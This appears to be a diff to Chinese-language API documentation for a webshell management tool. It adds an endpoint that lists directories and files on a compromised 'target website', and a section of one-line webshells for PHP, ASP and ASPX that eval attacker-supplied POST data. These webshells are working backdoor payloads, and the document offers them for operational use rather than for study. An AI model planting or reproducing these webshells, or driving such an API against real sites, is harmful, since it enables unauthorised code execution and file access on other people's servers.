@@ -115,6 +115,36 @@ www 根目录
 }
 ```
 
+#### 获取目标网站目录、文件
+```javascript
+地址:   /RootApi/webshell/listFiles
+方式:   POST
+参数:
+{
+	url:'url地址',
+	path:'/usr/local/www'
+}
+类型:   Json
+示例:
+{
+	"type":"success",
+	"info":{
+		"catalogue":[
+			"App",
+			"core",
+			"view"
+		],
+		"files":[
+			"index.html",
+			"ip.txt",
+			"passwd.py",
+			"start.sh",
+		]
+	}
+}
+注意:   当path参数为空时，默认返回网站根目录。
+```
+
 #### 注意事项
 只有当API的类型为`Json`格式时才会有错误信息，而且所有的`错误信息`都按照以下格式。
 ```javascript
@@ -122,9 +152,11 @@ www 根目录
 	"type":"error",
 	"info":"错误信息"
 }
+```
 
-
-####血滴子一句话
+#### 血滴子一句话
+```
 PHP: <?php @eval($_POST['pass']);?>
 ASP: <%eval request("pass")%>
 ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+```
